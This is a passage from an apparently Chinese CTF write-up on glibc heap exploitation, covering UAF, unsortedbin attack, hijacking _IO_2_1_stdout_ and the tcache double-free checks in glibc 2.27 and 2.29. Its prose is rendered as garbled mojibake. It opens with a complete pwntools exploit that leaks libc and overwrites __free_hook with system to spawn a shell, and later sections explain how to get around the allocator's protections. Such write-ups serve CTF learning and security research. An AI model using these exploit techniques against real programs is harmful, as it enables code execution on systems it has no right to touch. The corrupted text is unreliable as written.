pwn():\n\t#one_gadget = getOnegadget()\n\theap_base = leak_heap()\n\tlibc_base = leak_libc() - libc.sym['printf']\n\telf_base = leak_elf() - elf.sym['main']\n\tlog.info(\"heap_base:0x%x\"%heap_base)\n\tlog.info(\"libc_base:0x%x\"%libc_base)\n\tlog.info(\"elf_base:0x%x\"%elf_base)\n\n\tadd_malloc(0x1000-0x8,'PIG007NB')\n\n\t#prepare data-----------------------------------------------------------\n\tguess_libc = 0x9000\n\tguess_heap = 0x2000\n\tfastbinsY = guess_libc + libc.sym['main_arena'] + 8\n\t_IO_read_end = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x10\n\t_IO_write_base = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x20\n\t_IO_write_ptr = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x28\n\t_IO_write_end = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x30\n\n\tidx_read_end = (_IO_read_end - fastbinsY) / 8\n\tsize_read_end = idx_read_end * 0x10 + 0x20\n\n\tidx_write_base = (_IO_write_base - fastbinsY) / 8\n\tsize_write_base = idx_write_base * 0x10 + 0x20\n\n\tidx_write_ptr = (_IO_write_ptr - fastbinsY) / 8\n\tsize_write_ptr = idx_write_ptr * 0x10 + 0x20\n\n\tidx_write_end = (_IO_write_end - fastbinsY) / 8\n\tsize_write_end = idx_write_end * 0x10 + 0x20\n\n\ttarget_addr_gMF = guess_libc + libc.sym['global_max_fast']\n\n\tfastbinsY = libc.sym['main_arena'] + 8\n\ttarget_addr_binsY = libc.sym['__free_hook']-0x10\n\tidx_free_hook = (target_addr_binsY - fastbinsY) / 8\n\tsize_free_hook = idx_free_hook * 0x10 + 0x20\n\n\t#read_end-------------------------------------------------------------\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x1\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x2  point free  read_end\n\tadd_malloc(0x38,\"\\x03\"*0x38)\t\t\t\t#idx\t0x3\n\tadd_malloc(0x38,'\\x04'*0x18+p64(0x21)+'\\x04'*0x18)\t\t#idx\t0x4\n\n\tfree(0x1)\n\t#free(2)\n\tfree(0x3)\n\tedit(0x3,0x1,'\\x20')\n\tedit(0x1,0x20,p64(0x0)*3+p64(0x41))\n\n\tadd_malloc(0x38,'\\x05'*0x18+p64(0x21)+'\\x05'*0x18)\t\t\t\t#idx\t0x5\n\tadd_malloc(0x38,'\\x06'*0x18)\t\t\t\t\t\t\t\t\t#idx\t0x6 #point change size\n\t#---------------------------------------------------------------------\n\n\n\t#write_end can not be so far from wirte_base\n\tadd_malloc(size_write_end-0x8,(p64(0x0)+p64(0x21))*((size_write_end-0x10)/0x10))\t\t\t\t#idx\t0x7\n\tadd_malloc(size_write_ptr-0x8,(p64(0x0)+p64(0x21))*((size_write_ptr-0x10)/0x10))\t\t\t\t#idx\t0x8\n\n\n\t#write_base-----------------------------------------------------------\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x9\n\tadd_malloc(0x38,\"\\xaa\"*0x38)\t\t\t\t#idx\t0xa\n\tadd_malloc(0x38,\"\\x0b\"*0x38)\t\t\t\t#idx\t0xb\n\tadd_malloc(0x38,'\\x0c'*0x18+p64(0x21)+'\\xaa'*0x18)\t\t#idx\t0xc\n\n\tfree(0x9)\n\t#free(2)\n\tfree(0xb)\n\tedit(0xb,0x2,p16((guess_heap+0x1000+0x40)&0xffff))\n\tedit(0x9,0x20,p64(0x0)*3+p64(0x41))\n\n\tadd_malloc(0x38,'\\x0d'*0x18+p64(0x21)+'\\x05'*0x18)\t\t\t\t#idx\t0xd\n\tadd_malloc(0x38,'\\x0e'*0x18)\t\t\t\t\t\t\t\t\t#idx\t0xe #point free\n\t#---------------------------------------------------------------------\n\n\n\n\t#prepare for free_hook\n\tadd_malloc(size_free_hook-0x8,'PIG007NB')\t\t\t#idxf\n\tadd_malloc(size_free_hook+0x10-0x8,'PIG007NB')\t\t#idx10\n\n\n\t#unsortedbin attack\n\tadd_malloc(0x4f8,'\\x11'*0x4f8)\t\t\t#idx 0x11\n\tadd_malloc(0x38,'\\x12'*0x38)\t\t\t#idx 0x12\n\tfree(0x11)\n\tedit(0x11,0x8+0x2,p64(0x0)+p16((target_addr_gMF&0xffff)-0x10))\n\tadd_malloc(0x4f8,'/bin/sh\\x00')\t\t\t#idx 0x13\n\n\n\n\t#change write_base \n\tedit_m(0x6,0x20,p64(0x0)*3+p64(size_write_base+1))\n\tfree_m(0xe)\n\n\n\t#change write_end and write_ptr\n\tfree_m(0x7)\n\tfree_m(0x8)\n\n\n\t#change read_end\n\tedit_m(0x6,0x20,p64(0x0)*3+p64(size_read_end+1))\n\tfree_m(0x2)\n\n\tlibc_base = u64Leakbase(libc.sym['_IO_2_1_stdout_']+131)\n\tlg(\"libc_base\",libc_base)\n\n\t#write free_hook - 0x10\n\tfree(0xf)\n\n\t#left size\n\tedit(0xf,0x8,p64(size_free_hook+0x10+1))\n\tadd_malloc(size_free_hook-0x8,'PIG007NB')\n\n\t#get free_hook - 0x8\n\tfree(0x10)\n\tedit(0x10,0x8,p64(libc_base + target_addr_binsY -0x8))\n\tadd_malloc(size_free_hook+0x10-0x8,'PIG007NB')\n\tadd_malloc(size_free_hook+0x10-0x8,p64(0x0)+p64(libc_base + libc.sym['system']))\n\n\t#get shell\n\tfree(0x13)\n\tit()\n\n\n\n\n\ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\nâ–²é€šå¸¸éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œwrite_baseå’Œwrite_endä¸èƒ½ç›¸è·å¤ªè¿œï¼Œä¸ç„¶å¾ˆå®¹æ˜“æ•°æ®é‡è¿‡å¤§è€Œå´©æºƒã€‚è¿˜æœ‰è¿™é‡Œæœ€åæ³„éœ²åœ°å€æ˜¯\n\nlibc_base = u64Leakbase(libc.sym['_IO_2_1_stdout_']+131)\n\nè¿™æ˜¯å› ä¸ºIOæµçš„æœºåˆ¶ï¼Œä¼šåœ¨å†™å…¥æ•°æ®çš„0x10å¤„ä¸Šå†™ä¸‹libc.sym['_IO_2_1_stdout_']+131çš„åœ°å€ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥å°±èƒ½æ³„éœ²ã€‚\n\nâ–²é¢˜å¤–è¯ï¼šçˆ†ç ´çš„æ•°å­¦æœŸæœ›ä¸º1/256\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-17_18-07-31.png)\n\n## 4.UAF + æ— Leak + Sizeåšé™åˆ¶\n\nâ–²åŒæ ·sizeåšé™åˆ¶ä¸€èˆ¬ä¹Ÿåˆ†ä¸ºä»¥ä¸‹å‡ ç§\n\n(1)åªèƒ½æ˜¯å°Chunkï¼Œå³0x20~0x80ï¼š\n\nè¿™ä¸ªä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œåˆ©ç”¨UAFéƒ¨åˆ†å†™å…¥heap_addråˆ¶é€ å †å—é‡å ï¼Œä¿®æ”¹sizeåŸŸï¼Œæ”¾å…¥unsortedbinï¼Œç„¶åéƒ¨åˆ†å†™å…¥libc_addræ‰“unsortedbin attackä¿®æ”¹global_max_fastï¼Œä¹‹åå°±ç±»ä¼¼äº†ï¼ŒåŠ«æŒ_IO_2_1_stdoutæ³„éœ²åœ°å€ï¼ŒfastbinYæœºåˆ¶åŠ«æŒmain_arenaï¼Œä¿®å¤unsortedbinåæ”¹top_chunkåŠ«æŒmalloc_hookå³å¯ã€‚\n\n(2)åªèƒ½æ˜¯ä¸­ç­‰çš„chunkï¼Œå¤§äºfatsbinå°äºlargebinçš„ï¼Œå³0x90~0x3f0ã€‚\n\nç±»ä¼¼ï¼Œéƒ¨åˆ†å†™ä¿®æ”¹sizeåŸŸæ‰“unsortedbin attackï¼Œä¿®æ”¹global_max_fastï¼ŒåŠ«æŒ_IO_2_1_stdoutæ³„éœ²åœ°å€ã€‚fastbinYæœºåˆ¶åŠ«æŒfree_hookã€‚\n\n(3)åªèƒ½æ˜¯å¤§chunkï¼Œå³0x400~...\n\nç›´æ¥ç”¨éƒ¨åˆ†å†™libc_addræ‰“unsortedbin attackï¼Œä¿®æ”¹global_max_fastï¼ŒåŠ«æŒ_IO_2_1_stdoutæ³„éœ²åœ°å€ï¼Œä¹‹ååˆ©ç”¨fastbinYæœºåˆ¶å¯åœ¨free_hooké™„è¿‘ä¼ªé€ å †sizeï¼Œç„¶åç”³è¯·è¿‡å»ä¿®æ”¹free_hookä¸ºsystemï¼Œé‡Šæ”¾å †å—å³å¯ã€‚\n\n(4)æŒ‡å®šçš„chunk sizeã€‚\n\nâ–²å…¶å®å¯¹äºUAFæ¥è¯´ï¼Œsizeåšæ²¡åšé™åˆ¶éƒ½å·®ä¸äº†å¤ªå¤šï¼Œå› ä¸ºéƒ½å¯ä»¥éƒ¨åˆ†å†™å †å—åœ°å€åˆ¶é€ å †é‡å ï¼Œç„¶åå°±èƒ½ä¿®æ”¹sizeåŸŸï¼Œå”¯ä¸€åŒºåˆ†çš„å°±æ˜¯ç”³è¯·æ—¶å€™çš„é™åˆ¶ï¼Œå°çš„å°±æ‰“top_chunkï¼Œå¤§çš„å°±ç›´æ¥æ‰“_free_hookã€‚æ¯”è¾ƒæœ‰æ„æ€çš„ä¸€ç‚¹å°±æ˜¯é™åˆ¶ç‰¹å®šsizeï¼Œä¸€èˆ¬é™åˆ¶ä¸ºä¸¤ä¸ªï¼Œä»¥å‰é‡åˆ°0x20å’Œ0x30ï¼Œä¹Ÿæœ‰0x40å’Œ0x50çš„ï¼Œéƒ½æ˜¯å¤§åŒå°å¼‚ï¼Œå€Ÿç”¨fastbinYæœºåˆ¶ç•™ä¸‹sizeåç”³è¯·è¿‡å»å³å¯ã€‚\n\n \n\n# å››ã€Glibc2.27\n\nUAFåœ¨è¿™ä¸ªç‰ˆæœ¬ä¸‹å¯¹äºtcacheå®åœ¨æ˜¯å¥½ç”¨ï¼Œç”±äºtcacheä¸æ£€æŸ¥sizeä½ï¼Œä¹Ÿä¸æ£€æŸ¥FDï¼Œåªè¦æ³„éœ²äº†åœ°å€ï¼ŒåŠ ä¸ŠUAFå°±èƒ½å®ç°ä»»æ„ç”³è¯·ã€‚è€Œå¯¹äºæ— showåŠŸèƒ½çš„ï¼Œæ—¢å¯ä»¥å€ŸåŠ©unsortedbinè¸©ä¸‹åœ°å€åçˆ†ç ´ç›´æ¥ç”³è¯·ï¼Œä¹Ÿå¯ä»¥unsortedbin attackåŠ«æŒglobal_fast_maxä¹‹åå†åŠ«æŒIO_2_1_stdoutç»“æ„æ³„éœ²åœ°å€ã€‚\n\n## 1.Sashingæœºåˆ¶å¸¦æ¥çš„æ”¹å˜\n\n### (1)åŠ å…¥çš„æ£€æŸ¥åˆ¤æ–­ï¼š\n\néœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œç”±äºåŠ å…¥äº†tcacheçš„stahingæœºåˆ¶ï¼Œæ‰€ä»¥åœ¨ä»fastbinä¸­ç”³è¯·æ—¶ä¼šæœ‰ä¸€ä¸ªåˆ¤æ–­ï¼š\n\nï¼ˆ**è¿™ä¸ªåœ¨2.26å¼€å§‹å°±å­˜åœ¨çš„ï¼Œåªä¸è¿‡å¯èƒ½ä»£ç ä¸å¤ªä¸€æ ·ï¼Œæ‰€ä»¥æœ‰tcacheçš„åœ°æ–¹ï¼Œfastbinä¿®æ”¹fdä»è€Œåœ¨main_arenaä¸Šç•™ä¸‹fdçš„åŠŸèƒ½å°±æ— æ³•ä½¿ç”¨äº†ï¼‰**\n\n![Snipaste_2021-08-19_21-32-57](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108192133799.png)\n\n ç”±äºtcacheçš„stashingæœºåˆ¶ï¼Œå¦‚æœä»fastbinä¸­å–chunkï¼Œé‚£ä¹ˆå¦‚æœè¯¥å¤§å°çš„fastbiné“¾ä¸­è¿˜æœ‰å…¶ä»–chunkï¼Œåˆ™ä¼šå°è¯•å°†è¯¥å¤§å°çš„fastbiné“¾ä¸­å‰©ä½™çš„chunkéƒ½æ”¾å…¥å¯¹åº”å¤§å°çš„tcacheä¸­ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°å¦‚ä¸Šçš„å¯¹fastbinä¸­çš„fdè¿›è¡Œå–å‡ºæ£€æŸ¥ï¼Œè¿™é‡Œæˆ‘è®¾ç½®äº†fastbinä¸­Chunkçš„fdä¸º0x71ï¼Œå³rdxçš„å€¼ï¼Œå¯¼è‡´å‡ºé”™ã€‚\n\n```c\n//æ³¨é‡Šå¤´\n\n*fb = tc_victim->fd;\n\nmov    rax, qword ptr [rdx + 0x10]\n```\n\nè¿™ä¸ªä»£ç ä»¥åŠæ±‡ç¼–èµ‹å€¼ï¼Œä½¿å¾—[rdx+0x10]ï¼Œå³å–0x71çš„fdæŒ‡é’ˆï¼Œé‚£è‚¯å®šä¼šå‡ºé”™ã€‚åŒæ ·çš„ï¼Œå¦‚æœä¿®æ”¹fastbinä¸­chunkçš„fdä¹Ÿä¸å†æ˜¯ç®€å•åœ°ä¼ªé€ sizeäº†ï¼Œè¿˜éœ€è¦è€ƒè™‘å¯¹åº”FDçš„fdæŒ‡é’ˆæœ‰æ•ˆæ€§ã€‚\n\n### (2)å¯¹æŠ—åˆ©ç”¨ï¼š\n\n#### â‘ have_fastchunks:\n\nè™½ç„¶FDä¸èƒ½ç•™ä¸‹ä¼ªé€ åœ°å€ï¼Œä½†æ˜¯å¯ä»¥é‡Šæ”¾ä¸€ä¸ªchunkè¿›å…¥fastbinï¼Œå°†main_arena.have_fastchunksç½®1ï¼Œä¹‹ååˆ©ç”¨main_arena.have_fastchunksç•™ä¸‹çš„0x1åœ¨ä¸Šé¢æ¥ç”³è¯·0x100çš„å­—èŠ‚é”™ä½ï¼Œä½†æ˜¯è¿™ä¸ªéœ€è¦å…ˆä¿®æ”¹global_max_fastæ‰èƒ½ç”³è¯·0x100çš„fastbinChunkã€‚\n\n![Snipaste_2021-08-27_14-48-12](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827144821.png)\n\n#### â‘£top_chunk:\n\næ­¤å¤–ï¼Œå€Ÿç”¨çˆ†ç ´chunkåœ°å€ï¼Œå°†top_chunkçš„0x56å½“ä½œåˆæ³•sizeä¹Ÿæ˜¯å¯ä»¥çš„ã€‚\n\n![Snipaste_2021-08-27_14-42-24](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827144239.png)\n\nä½†æ˜¯å…¶å®ä¹Ÿæ²¡å·®ï¼Œæ—¢ç„¶æœ‰tcacheï¼Œé‚£æˆ‘è¿˜ç”¨fastbinç”³è¯·å¹²å•¥ï¼Œç›´æ¥tcacheè·å¾—åœ°å€ä¹‹åä»»æ„ç”³è¯·ä¸å°±å®Œäº†ï¼Œé™¤éå…¨æ˜¯callocï¼Œä½†è¿™ç§æƒ…å†µå…¶å®è¿˜æœ‰æ›´æ–¹ä¾¿çš„è§£æ³•ï¼Œå³`house of banana`ã€‚æ‰€ä»¥è¦æ˜¯ç¢°åˆ°2.27ç‰ˆæœ¬çš„ï¼Œç®€ç›´å°±æ˜¯çƒ§é«˜é¦™äº†ã€‚\n\n## 2.Glibc2.27Tcacheé¢˜å¤–è¯ï¼š\n\nç°ä»Šç‰ˆæœ¬ï¼Œ2020å¹´09æœˆ10æ—¥å¼€å§‹ï¼Œä»2.27-3ubuntu1.3å¼€å§‹ï¼Œå°±å·²ç»å¯¹tcacheåšäº†éƒ¨åˆ†ä¿®æ”¹ï¼Œå¾ˆæ¥è¿‘2.29çš„ï¼Œè€Œç°åœ¨çš„é¢˜ç›®åŸºæœ¬éƒ½æ˜¯åŸºäºè¿™ç§å¢å¼ºå‹ç‰ˆæœ¬çš„ï¼Œå·²ç»ä¸å­˜åœ¨double freeäº†ã€‚\n\n[Glibc 2.27å…³äºTcacheçš„å¢å¼ºä¿æŠ¤ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/219292#h2-2)\n\næ–°å¢å¦‚ä¸‹ï¼š\n\n### (1)Keyå­—æ®µæ–°å¢ï¼š\n\n```c\n/* We overlay this structure on the user-data portion of a chunk when\n   the chunk is stored in the per-thread cache.  */\ntypedef struct tcache_entry\n{\n    struct tcache_entry *next;\n    /* This field exists to detect double frees.  */\n    struct tcache_perthread_struct *key;\n} tcache_entry;\n```\n\nåŒæ ·çš„å¯¹åº”tcache_putä¼šåŠ å…¥keyå­—æ®µï¼Œtcache_getä¸­ä¼šæ¸…é™¤keyå­—æ®µï¼Œ_int_freeå‡½æ•°ä¼š**æ ¹æ®keyå­—æ®µ**åˆ¤æ–­double freeã€‚\n\nè¿™é‡Œè®²ä¸ªå°æŠ€å·§ï¼Œå¦‚æœå‘ç°é¢˜ç›®çš„libc.soç‰ˆæœ¬åœ¨2.27-3ubuntu1.3ä¹‹ä¸‹ï¼Œé‚£ä¹ˆå°±æ²¡æœ‰keyå­—æ®µï¼Œå­˜åœ¨æ— é™åˆ¶çš„double freeï¼Œç›´æ¥æå®šã€‚è€Œå¸¸è§„çš„2.28ç‰ˆæœ¬å…¶å®ä¹Ÿè¿˜å­˜åœ¨double freeï¼ŒæŸ¥çœ‹_int_freeç›¸å…³æºç å³å¯å‘ç°ã€‚\n\nå…·ä½“åˆ©ç”¨å’Œç»•è¿‡åé¢è®²ã€‚\n\n### (2)Tcacheæ•°é‡é™åˆ¶\n\n```c\n#define MAX_TCACHE_COUNT 127    /* Maximum value of counts[] entries.  */\n```\n\nè¿™ä¸ªæ²¡å‘ç°æœ‰å•¥ç”¨ï¼Œä¼ ç»Ÿçš„åªæœ‰2.30å¼€å§‹æ‰ç”¨åˆ°äº†è¿™ä¸ªï¼Œä½ç‰ˆæœ¬è¿å®šä¹‰éƒ½æ²¡æœ‰ï¼Œé™¤äº†è¿™ä¸ªå¢å¼ºå‹çš„2.27\n\n```c\n//2.30\n\ndo_set_tcache_count (size_t value)\n{\n    if (value <= MAX_TCACHE_COUNT)\n    {\n        LIBC_PROBE (memory_tunable_tcache_count, 2, value, mp_.tcache_count);\n        mp_.tcache_count = value;\n    }\n    return 1;\n}\n```\n\nè¿™å°±å¾ˆè¿·æƒ‘ï¼Œé€šå¸¸å®šä¹‰çš„tcache_countæ˜¯7ï¼Œè€Œè¿™é‡Œå´è¦æ±‚å°äºMAX_TCACHE_COUNT(127)ï¼Œæ˜¯å› ä¸ºGNUçš„å…¶ä»–åŠŸèƒ½å¯èƒ½ä¼šæ”¹å˜tcacheçš„ç»“æ„å—ï¼Œæ¯”å¦‚å°†tcache_countä¿®æ”¹ä¸º127ï¼Œæ‰©å¤§tcacheæ¥ä½¿ç”¨å—ï¼Œç­‰å¾…å¤§ä½¬å‘ç°æ¼æ´ã€‚\n\nå¦å¤–è¯¥æ–‡ç« ä¸­è¿˜è¯´äº†reallocå¯¹åº”memcpyçš„ä½¿ç”¨ä¿®æ”¹ï¼Œæ„Ÿè§‰æ²¡å•¥ç”¨ã€‚\n\næ€»çš„æ¥è¯´ï¼Œå…¶å®å°±ç›¸å½“äºå°†2.27çš„tcacheå¢å¼ºæˆäº†2.29ï¼Œå…¶ä»–çš„åˆ°æ²¡å•¥å˜åŒ–ã€‚\n\n\n\n# äº”ã€Glibc2.29\n\n## 1.éƒ¨åˆ†æ‰‹æ®µå¤±æ•ˆ\n\n### (1)unsortedbin attackå¤±æ•ˆ\n\nè¿™ä¸ªç‰ˆæœ¬ä¸‹çš„unsortedbin attckå·²ç»å¤±æ•ˆï¼ŒåŸå› æ˜¯æ–°å¢å¦‚ä¸‹æ£€æŸ¥ï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nmchunkptr next = chunk_at_offset (victim, size);\nif (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ)\n    || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))\n    malloc_printerr (\"malloc(): invalid next size (unsorted)\");\nif (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))\n    malloc_printerr (\"malloc(): mismatching next->prev_size (unsorted)\");\nif (__glibc_unlikely (bck->fd != victim)\n    || __glibc_unlikely (victim->fd != unsorted_chunks (av)))\n    malloc_printerr (\"malloc(): unsorted double linked list corrupted\");\nif (__glibc_unlikely (prev_inuse (next)))\n    malloc_printerr (\"malloc(): invalid next->prev_inuse (unsorted)\");\n```\n\nâ‘ ä¸‹ä¸€ä¸ªchunkçš„sizeæ˜¯å¦åœ¨åˆç†åŒºé—´\n\nâ‘¡ä¸‹ä¸€ä¸ªchunkçš„prevsizeæ˜¯å¦ç­‰äºvictimçš„size\n\nâ‘¢æ£€æŸ¥unsortedbinåŒå‘é“¾è¡¨çš„å®Œæ•´æ€§\n\nâ‘£ä¸‹ä¸€ä¸ªchunkçš„previnuseæ ‡å¿—ä½æ˜¯å¦ä¸º0\n\nå…¶å®æœ€è¦å‘½çš„æ˜¯æ£€æŸ¥åŒå‘é“¾è¡¨çš„å®Œæ•´æ€§ï¼Œè¿˜å¾—åœ¨ç›®çš„åœ°å€çš„fdä¼ªé€ victimï¼Œéƒ½èƒ½ä¼ªé€ åœ°å€äº†è¿˜ç”¨è¿™ï¼Œæ‰€ä»¥ç›´æ¥åºŸå¼ƒã€‚Tcache_Stashing_Unlink_Attackæ¥ç±»ä¼¼ä»£æ›¿unsortedbin attackï¼Œä¸è¿‡Tcache_Stashing_Unlink_Attackä¸€èˆ¬éœ€è¦ç”¨åˆ°callocï¼Œå¦‚æœæœ‰UAFæ³„éœ²åœ°å€çš„è¯å€’æ˜¯ä¸å¤ªéœ€è¦ã€‚\n\n### (2)top_chunkæ”¹å†™é™åˆ¶\n\næ–°å¢æ£€æŸ¥ï¼š\n\n```C\n#æ³¨é‡Šå¤´\n\nif (__glibc_unlikely (size > av->system_mem))  //0x21000        \n    malloc_printerr (\"malloc(): corrupted top size\");\n```\n\nå³sizeéœ€è¦å°äºç­‰äºsystem_mems = 0x21000ã€‚ä¹‹å‰ç”±top_chunkå¼•å‘çš„ä¸€ç³»åˆ—æ¼æ´ï¼Œç±»ä¼¼House of orange,\n\nHouse of Forceä»¥åŠä¹‹å‰æåˆ°çš„ä¿®æ”¹top_chunkåˆ°malloc_hooké™„è¿‘ç­‰ï¼Œéƒ½ä¸å¤ªè¡Œäº†ã€‚\n\n### (3)unlinkæ–¹é¢ä¸€äº›é™åˆ¶\n\næ–°å¢æ£€æŸ¥ï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nif(__glibc_unlikely (chunksize(p) != prevsize))\t*//new*        \n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n```\n\nå³ä¼šåˆ¤æ–­æ‰¾åˆ°çš„ä¹‹å‰ä¸ºFreeçŠ¶æ€çš„chunkå’Œå½“å‰è¦é‡Šæ”¾chunkçš„prevsizeæ˜¯å¦ç›¸ç­‰\n\nè¿™ä¸ªå¯¹äºUAFæ–¹é¢æ¥è¯´æ²¡å•¥å½±å“ï¼Œå› ä¸ºUAFæœ¬èº«å°±åŸºæœ¬ç›´æ¥é€ æˆå †å—é‡å ï¼Œè€Œunlinké€šå¸¸å°±æ˜¯ç»“åˆoff-by-nullæ¥åˆ¶é€ å †å—é‡å çš„ã€‚off-by-nullå’Œoff-by-oneä¹‹åå¼€ä¸€ä¸ªä¸“é—¨çš„æ¥è®¨è®ºã€‚\n\n### (4)tcacheæ–¹é¢çš„å˜åŒ–\n\n#### â‘ æ–°å¢keyå­—æ®µ\n\n```c\n#æ³¨é‡Šå¤´\n\ntypedef struct tcache_entry\n{\n    struct tcache_entry *next;\n    /* This field exists to detect double frees.  */\n    struct tcache_perthread_struct *key;\n} tcache_entry;\n\n//-------------------------------------------------------------------------------\n\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n    assert (tc_idx < TCACHE_MAX_BINS);\n\n    /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n    e->key = tcache;\t//add\n\n    e->next = tcache->entries[tc_idx];\n    tcache->entries[tc_idx] = e;\n    ++(tcache->counts[tc_idx]);\n}\n\ntcache_get (size_t tc_idx)\n{\n    tcache_entry *e = tcache->entries[tc_idx];\n    assert (tc_idx < TCACHE_MAX_BINS);\n    assert (tcache->entries[tc_idx] > 0);\n    tcache->entries[tc_idx] = e->next;\n    --(tcache->counts[tc_idx]);\n    e->key = NULL;\t//add\n    return (void *) e;\n}\n\n\n```\n\nå³ä¼šåœ¨é‡Šæ”¾chunkçš„bkå¤„åŠ å…¥keyå­—æ®µï¼Œä¸€èˆ¬ä¸ºheap_base+0x10ï¼Œå³å½“å‰çº¿ç¨‹çš„tcache structçš„åœ°æ–¹ã€‚é‡Šæ”¾æ—¶èµ‹å€¼ï¼Œç”³è¯·å›æ¥æ—¶ç½®é›¶ã€‚\n\n#### â‘¡æ–°å¢çš„ä¸€äº›æ£€æŸ¥\n\n```c\n//æ³¨é‡Šå¤´\n\n{\n    size_t tc_idx = csize2tidx (size);\n    if (tcache != NULL && tc_idx < mp_.tcache_bins)\n    {\n        /* Check to see if it's already in the tcache.  */\n        tcache_entry *e = (tcache_entry *) chunk2mem (p);\n\n        /* This test succeeds on double free.  However, we don't 100%\n   trust it (it also matches random payload data at a 1 in\n   2^<size_t> chance), so verify it's not an unlikely\n   coincidence before aborting.  */\n        if (__glibc_unlikely (e->key == tcache))\n        {\n            tcache_entry *tmp;\n            LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);\n            for (tmp = tcache->entries[tc_idx];\n                 tmp;\n                 tmp = tmp->next)\n                if (tmp == e)\n                    malloc_printerr (\"free(): double free detected in tcache 2\");\n            /* If we get here, it was a coincidence.  We've wasted a\n       few cycles, but don't abort.  */\n        }\n\n        if (tcache->counts[tc_idx] < mp_.tcache_count)\n        {\n            tcache_put (p, tc_idx);\n            return;\n        }\n    }\n}\n```\né‡ç‚¹æ˜¯è¿™é‡Œ**if (__glibc_unlikely (e->key == tcache))**ï¼Œå³é’ˆå¯¹ä¹‹å‰tcache dupåšçš„é™åˆ¶ï¼Œæ£€æŸ¥è¦é‡Šæ”¾chunkçš„keyå­—æ®µï¼Œå¦‚æœç­‰äºtcacheç»“æ„ä½“åœ°å€ï¼Œåˆ™éå†å¯¹äºçš„tcacheä¸­çš„chunkæ˜¯å¦å’Œè¯¥chunkä¸ºåŒä¸€ä¸ªchunkï¼Œæ˜¯åˆ™æŠ¥é”™ã€‚è¿™ä¸ªå¥½ç»•è¿‡ï¼Œé€šå¸¸å¯ä»¥åˆ©ç”¨æ¼æ´æ”¹æ‰tcacheä¸­å¯¹äºchunkçš„bkæŒ‡é’ˆå³å¯ã€‚ç”±äºunsortedbin attackå¤±æ•ˆï¼Œè€ŒTcache_Stashing_Unlink_Attacké€šå¸¸è¿˜éœ€è¦ç»“åˆå †æº¢å‡ºï¼ŒUAFä¹‹ç±»çš„æ¼æ´ï¼Œæ‰€ä»¥å¸¸å¸¸å¯ä»¥**é…åˆlargebin attackæ¥è¿›è¡Œæ”»å‡»tcache dupã€‚**\n\nâ–²è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ‰çš„2.27ç‰ˆæœ¬å·²ç»å¼•å…¥äº†2.29ä¸­çš„ä¸€äº›æœºåˆ¶ï¼Œåˆšåˆšæåˆ°çš„ï¼Œæ¯”å¦‚keyå­—æ®µä¹‹ç±»çš„ï¼Œå…·ä½“åšé¢˜å…·ä½“åˆ†æã€‚\n\nå‚è€ƒï¼š[glibc-2.29æ–°å¢çš„ä¿æŠ¤æœºåˆ¶å­¦ä¹ æ€»ç»“ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/194960#h2-1)\n\n#### â‘¢å‡ºç°çš„æ–°æ‰‹æ®µ\n\nTcache stash unlink attackï¼Œå¾ˆå¤šå¸ˆå‚…åˆ†æè¿™ä¸ªæ¼æ´éƒ½æ˜¯åœ¨2.29ä¸‹å¼€å§‹åˆ†æï¼Œä½†å®é™…ä¸Šä»æœ€å¼€å§‹å¼•å…¥2.26çš„tcacheå°±å·²ç»æœ‰äº†ï¼Œåªä¸è¿‡å¯èƒ½æ˜¯ä¹‹å‰çš„unsortedbin attackå¤ªå¥½ç”¨ï¼Œå°±æ²¡å¼€å‘å‡ºæ¥è¿™ä¸ªæ¼æ´ã€‚\n\n```c\n//2.26  \n\nif (in_smallbin_range (nb))\n{\n    idx = smallbin_index (nb);\n    bin = bin_at (av, idx);\n\n    if ((victim = last (bin)) != bin)\n    {\n        if (victim == 0) /* initialization check */\n            malloc_consolidate (av);\n        else\n        {\n            bck = victim->bk;\n            if (__glibc_unlikely (bck->fd != victim))\n            {\n                errstr = \"malloc(): smallbin double linked list corrupted\";\n                goto errout;\n            }\n            set_inuse_bit_at_offset (victim, nb);\n            bin->bk = bck;\n            bck->fd = bin;\n\n            if (av != &main_arena)\n                set_non_main_arena (victim);\n            check_malloced_chunk (av, victim, nb);\n\n            #if USE_TCACHE\n            /* While we're here, if we see other chunks of the same size,\n\t     stash them in the tcache.  */\n            size_t tc_idx = csize2tidx (nb);\n            if (tcache && tc_idx < mp_.tcache_bins)\n            {\n                mchunkptr tc_victim;\n\n                /* While bin not empty and tcache not full, copy chunks over.  */\n                while 